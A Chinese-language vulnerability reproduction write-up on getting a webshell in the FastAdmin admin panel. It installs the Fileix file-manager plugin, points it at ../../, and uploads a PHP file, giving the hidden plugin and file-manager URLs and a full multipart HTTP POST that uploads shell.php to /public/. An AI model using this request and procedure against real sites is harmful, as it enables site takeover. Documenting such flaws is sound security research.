# FastAdmin 第三方插件后台getshell

## 一、漏洞简介

FastAdmin是基于ThinkPHP5和Bootstrap的后台框架，可以利用三方插件GetShell

## 二、漏洞影响

## 三、复现过程

开启phpstudy本地搭建

![](images/2020_07_08/15942248068221.jpg)


安装成功，新版源码的后台地址是随机生成的

![](images/2020_07_08/15942248168493.jpg)


后台默认会有插件管理功能，但是绝大部分用户会把这个功能阉割掉

![](images/2020_07_08/15942248257377.jpg)


Fileix文件管理器离线安装包官方下载地址：

```
https://www.fastadmin.net/store/fileix.html

```

点击离线安装，选择上传你下载的ZIP离线安装包

插件安装完成会自动启用，默认路径配置是这样的

![](images/2020_07_08/15942248354559.jpg)


然后打开是这样的

![](images/2020_07_08/15942248427092.jpg)


可以修改为 ../../，那么再打开就是这样的

![](images/2020_07_08/15942248497076.jpg)


然后浅显易懂，直接右键上传php文件就能getshell

![](images/2020_07_08/15942248564187.jpg)


上面是本地测试环境，真实环境会出现这样一个问题，就是点击文件管理功能不会显示任何内容

![](images/2020_07_08/15942248644572.jpg)


后来了解一下是因为没有配置前台页面，不太好修改，所以利用下面的方法

### 通用方法

1.插件管理地址：

```
/admin/addon?ref=addtabs

```

进入后台默认不显示插件管理功能，访问插件管理地址，上传离线安装包

![](images/2020_07_08/15942248988698.jpg)


2.文件管理地址/读取所有文件地址：

```
/admin/fileix?ref=addtabs/admin/fileix/lst

```

真实环境中如果出现不显示功能的情况，必要时可以读取所有文件地址

![](images/2020_07_08/15942249066072.jpg)


3.上传poc：

```bash
POST /admin/fileix/data?target=%2F HTTP/1.1
Host: www.baidu.com
Content-Length: 1050
Origin: http://www.baidu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrZmyeAB3SciJDWST
Accept: */*
Referer: http://www.baidu.com
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=xxxxxxxx
Connection: close

------WebKitFormBoundaryrZmyeAB3SciJDWST
Content-Disposition: form-data; name="upload"; filename="shell.php"
Content-Type: application/octet-stream

code
------WebKitFormBoundaryrZmyeAB3SciJDWST
Content-Disposition: form-data; name="action"

upload
------WebKitFormBoundaryrZmyeAB3SciJDWST
Content-Disposition: form-data; name="target"

/public/
------WebKitFormBoundaryrZmyeAB3SciJDWST--

```

修改host地址post过去

![](images/2020_07_08/15942249313535.jpg)


利用poc成功上传shell

![](images/2020_07_08/15942249380494.jpg)


## 参考链接

> https://mp.weixin.qq.com/s?__biz=MzU5NjQ0NTE4NA==&mid=2247484075&idx=1&sn=11e65cec3f039999f866698506a36f28&chksm=fe63d3c4c9145ad2e21001823f540bb0bd6c23a6ec664140b822469da4d8d54b861ef018ea7f&scene=126&sessionid=1593434570&key=b5fefcfa89041be749d30d0e2266e1cb7156cb2e90b17f7b536842ddf2d3b5556f1173d87f4fc7179d317629e5d19d9463f24c10281da8b2849c4199764adf891e9e03d0f72d4d5180567f296802b53b&ascene=1&uin=MjQ5MTY5NzI0MQ%253D%253D&devicetype=Windows+10+x64&version=6209007b&lang=zh_CN&exportkey=A1vHlcBsOQV07c8LhOThsow%253D&pass_ticket=tAsIlNPv68VYYzmpmtjDaAEG6W%252FH9DIMUJnYgeEjVPNSs7%252BvoJq%252B0MFM2dMHbfEf

